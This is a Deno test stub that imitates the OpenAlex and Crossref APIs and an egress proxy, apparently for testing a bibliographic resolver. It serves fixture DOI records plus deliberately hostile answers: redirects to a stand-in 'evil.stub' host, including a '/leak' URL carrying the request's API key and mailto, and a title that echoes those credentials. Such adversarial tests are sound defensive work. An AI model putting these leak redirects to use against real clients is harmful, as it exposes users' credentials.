// The STUB OpenAlex + Crossref + egress proxy for the P6a disposable run (rw-p6a-resolve), run
// INSIDE a container on the run's internal network by run-export-tests.ps1. Never the real APIs,
// never the live proxy.
//
// The workbench under test is pointed at http://api.openalex.stub and http://api.crossref.stub -
// names that resolve NOWHERE - with FETCH_PROXY_URL=http://<this container>:8080. A request reaches
// this stub only through the proxy path, so every logged request is a proxied one.
//
// Fixture data (authored, the 10.5555 test prefix):
//   10.5555/p6a.001 .. .090      OpenAlex 200 ("Resolved title N (OpenAlex)")
//   10.5555/p6a.091 .. .100      OpenAlex 404, Crossref 200 ("Resolved title N (Crossref)")
//   10.5555/p6a.dead             404 from both: the dead DOI
//   10.48550/arxiv.2101.00001    OpenAlex 200 (an arXiv work)
// Hostile answers (rw-p6a-resolve attempt 2, the tester's ADV-2b / ADV-3 shapes):
//   10.5555/p6a.r01              OpenAlex 404; Crossref 302 -> http://api.openalex.stub/works/doi:... (no key)
//   10.5555/p6a.r02              OpenAlex 302 -> http://api.crossref.stub/works/... (no mailto)
//   10.5555/p6a.r03              OpenAlex 302 -> http://evil.stub/works/...
//   10.5555/p6a.r04              OpenAlex 302 -> http://evil.stub/leak?<the request's query: key + mailto>
//   10.5555/p6a.t01              OpenAlex 200 whose title echoes the request's query (key + mailto);
//                                Crossref 404 (so the reference fails: no clean record anywhere)
// Any other .stub host (evil.stub) is logged and answered 200, so a followed redirect is SEEN.
// Run with --network-alias api.openalex.stub/api.crossref.stub/evil.stub as the DIRECT CATCHER, it
// logs a request that skipped the proxy (the run expects none).
// Control (Host = this container's name, not a .stub name):
//   GET  /_log            every request logged so far: method, host, path, query, user-agent
//   POST /_reset          clear the log
//   POST /_mode?fail=1    from now on answer 503 to every service request (still logged); fail=0 back
const log: { at: number; method: string; host: string; path: string; query: Record<string, string>; user_agent: string | null }[] = [];
let failAll = false;

const n3 = (doi: string) => /^10\.5555\/p6a\.(\d{3})$/.exec(doi)?.[1];

const redirect = (to: string): [number, unknown, string] => [302, null, to];

function openalexWork(key: string, query: URLSearchParams): [number, unknown, string?] {
  if (key === "doi:10.5555/p6a.r01") return [404, { error: "Not Found" }];
  if (key === "doi:10.5555/p6a.r02") return redirect("http://api.crossref.stub/works/10.5555/p6a.r02");
  if (key === "doi:10.5555/p6a.r03") return redirect("http://evil.stub/works/10.5555/p6a.r03");
  if (key === "doi:10.5555/p6a.r04") return redirect(`http://evil.stub/leak?${query}`);
  if (key === "doi:10.5555/p6a.t01") {
    return [200, { id: "https://openalex.org/W6AT01", title: `Echo title ${[...query].map(([k, v]) => `${k}=${v}`).join(" ")}`, type: "article" }];
  }
  if (key === "doi:10.48550/arxiv.2101.00001") {
    return [200, { id: "https://openalex.org/W6A0000001", doi: "https://doi.org/10.48550/arxiv.2101.00001", title: "Resolved arXiv work (OpenAlex)",
      type: "preprint", publication_date: "2021-01-01", authorships: [{ author: { display_name: "Arxiv Fixture Author" } }],
      primary_location: { source: { display_name: "arXiv" } }, biblio: {} }];
  }
  const m = /^doi:(.+)$/.exec(key);
  const n = m ? n3(m[1]) : undefined;
  if (!n || Number(n) > 90) return [404, { error: "Not Found", message: `${key} is not in the fixture` }];
  return [200, {
    id: `https://openalex.org/W6A${n}`, doi: `https://doi.org/10.5555/p6a.${n}`, title: `Resolved title ${Number(n)} (OpenAlex)`,
    type: "article", publication_date: "2020-01-01", authorships: [{ author: { display_name: `Ann Author${Number(n)}` } }],
    primary_location: { source: { display_name: "Journal of Fixtures", host_organization_name: "Fixture Press" } },
    biblio: { volume: String(Number(n)), issue: "1", first_page: "1", last_page: "9" },
  }];
}

function crossrefWork(doi: string): [number, unknown, string?] {
  if (doi === "10.5555/p6a.r01") return redirect("http://api.openalex.stub/works/doi:10.5555/p6a.r01");
  const n = n3(doi);
  if (!n || Number(n) <= 90) return [404, { status: "error", message: "Resource not found." }];
  return [200, { status: "ok", message: {
    DOI: `10.5555/p6a.${n}`, type: "journal-article", title: [`Resolved title ${Number(n)} (Crossref)`],
    author: [{ given: "Ann", family: `Author${Number(n)}` }], "container-title": ["Journal of Fixtures"],
    volume: String(Number(n)), page: "1-9", issued: { "date-parts": [[2020, 1, 1]] },
  } }];
}

Deno.serve({ port: 8080, hostname: "0.0.0.0" }, async (req) => {
  const u = new URL(req.url);
  const host = (u.hostname.endsWith(".stub") ? u.hostname : (req.headers.get("host") ?? u.hostname)).split(":")[0];
  if (!host.endsWith(".stub")) {
    if (u.pathname === "/_log") return Response.json(log);
    if (u.pathname === "/_reset" && req.method === "POST") return (log.length = 0, Response.json({ ok: true }));
    if (u.pathname === "/_mode" && req.method === "POST") return (failAll = u.searchParams.get("fail") === "1", Response.json({ failAll }));
    return new Response("stub control: unknown", { status: 404 });
  }
  await req.body?.cancel();
  log.push({ at: Date.now(), method: req.method, host, path: decodeURIComponent(u.pathname), query: Object.fromEntries(u.searchParams), user_agent: req.headers.get("user-agent") });
  if (failAll) return Response.json({ error: "stub fail mode" }, { status: 503 });
  let r: [number, unknown, string?] = [200, { title: "evil", type: "article" }]; // a third host
  const path = decodeURIComponent(u.pathname);
  if (host === "api.openalex.stub") r = path.startsWith("/works/") ? openalexWork(path.slice("/works/".length), u.searchParams) : [404, { error: "unknown path" }];
  if (host === "api.crossref.stub") r = path.startsWith("/works/") ? crossrefWork(path.slice("/works/".length)) : [404, { error: "unknown path" }];
  if (r[2]) return new Response(null, { status: r[0], headers: { location: r[2] } });
  return Response.json(r[1], { status: r[0] });
});
